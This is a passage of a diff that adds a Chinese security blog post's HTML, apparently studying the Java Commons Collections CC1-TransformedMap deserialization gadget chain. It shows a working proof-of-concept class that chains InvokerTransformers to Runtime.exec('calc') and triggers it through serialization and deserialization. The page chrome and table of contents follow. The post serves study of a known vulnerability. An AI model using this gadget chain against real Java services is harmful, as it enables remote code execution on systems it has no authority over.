class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1_Transformer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// ChainedTransformer链式执行</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(Runtime.class);  // test</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;abc&quot;</span>);  <span class="comment">// 添加键值对</span></span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// AnnotationInvocationHandler类是default，不能直接获取</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span>  <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+	  <!--
+<div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+-->
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2023/11/15/java/cc/CC1-LazyMap/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2023/11/11/java/base/URLDNS/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2023-11-12 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Java/">Java<span>12</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/Deserialize/">Deserialize<span>7</span></a></li> <li><a href="/tags/CommonsCollections/">CommonsCollections<span>5</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#CC1-TransformedMap"><span class="toc-article-text">CC1-TransformedMap</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Transformer-%E6%89%A7%E8%A1%8C%E7%B1%BB"><span class="toc-article-text">Transformer-执行类</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%AF%BB%E6%89%BE%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-article-text">寻找调用链</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#InvokerTransformer"><span class="toc-article-text">InvokerTransformer</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#TransformedMap"><span class="toc-article-text">TransformedMap</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%AF%BB%E6%89%BE%E5%85%A5%E5%8F%A3%E7%B1%BB"><span class="toc-article-text">寻找入口类</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#readObject"><span class="toc-article-text">readObject()</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#ChainedTransformer"><span class="toc-article-text">ChainedTransformer</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#ConstantTransformer"><span class="toc-article-text">ConstantTransformer</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Gadget-chain"><span class="toc-article-text">Gadget chain</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Poc"><span class="toc-article-text">Poc</span></a></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 n2ryx's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
